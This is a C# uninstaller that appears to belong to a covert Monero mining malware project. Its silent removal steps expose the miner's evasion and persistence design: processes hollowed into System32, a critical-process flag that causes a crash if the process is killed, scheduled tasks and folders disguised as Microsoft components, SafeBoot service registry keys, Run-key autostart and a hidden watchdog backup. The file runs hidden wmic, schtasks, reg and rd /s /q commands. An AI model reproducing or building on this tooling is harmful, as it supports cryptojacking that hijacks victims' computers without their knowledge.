namespace MinerUninstaller;

internal class Program
{
    static void Main()
    {
        var folderName = UninstallerConfig.InstallName.EndsWith(".exe", StringComparison.OrdinalIgnoreCase)
            ? UninstallerConfig.InstallName[..^4] : UninstallerConfig.InstallName;

        var installDir = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "Microsoft", "Windows", folderName);

        // 1. Signal clean exit FIRST so miner removes its critical-process flag before we kill it
        //    Without this, killing a critical process causes BSOD
        try
        {
            var ev = System.Threading.EventWaitHandle.OpenExisting($"Global\\SeroXmr_{folderName}_exit");
            ev.Set();
            Thread.Sleep(3000); // wait for miner to remove critical flag and exit cleanly
        }
        catch { }

        // 2. Now safe to kill any remaining miner/hollow process
        RunHidden("wmic", $"process where \"ExecutablePath like '%AppData%\\\\Microsoft\\\\Windows\\\\{folderName}\\\\%'\" call terminate");
        RunHidden("wmic", $"process where (name='{UninstallerConfig.HollowTarget}' and ExecutablePath like '%System32%') call terminate");
        Thread.Sleep(2000);

        // 3. Remove scheduled tasks
        RunHidden("schtasks", $"/delete /tn \"Microsoft\\Windows\\{folderName}\" /f");
        RunHidden("schtasks", $"/delete /tn \"Microsoft\\Windows\\{folderName}Wd\" /f");

        // 4. Delete SafeBoot service
        RunHidden("sc.exe", $"delete \"{folderName}\"");

        Thread.Sleep(500);

        // 5. Remove install directory
        RunHidden("cmd.exe", $"/c rd /s /q \"{installDir}\"");

        // 6. Remove HKCU Run key
        RunHidden("reg.exe", $"delete \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{folderName}\" /f");

        // 7. Remove SafeBoot registry keys
        RunHidden("reg.exe", $"delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\{folderName}\" /f");
        RunHidden("reg.exe", $"delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\{folderName}\" /f");

        // 8. Remove watchdog backup
        var backupDir = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "Microsoft", "WindowsServices");
        RunHidden("cmd.exe", $"/c rd /s /q \"{backupDir}\"");
    }

    static void RunHidden(string exe, string args)
    {
        try
        {
            using var p = System.Diagnostics.Process.Start(
                new System.Diagnostics.ProcessStartInfo(exe, args)
                { CreateNoWindow = true, UseShellExecute = false });
            p?.WaitForExit(5000);
        }
        catch { }
    }
}
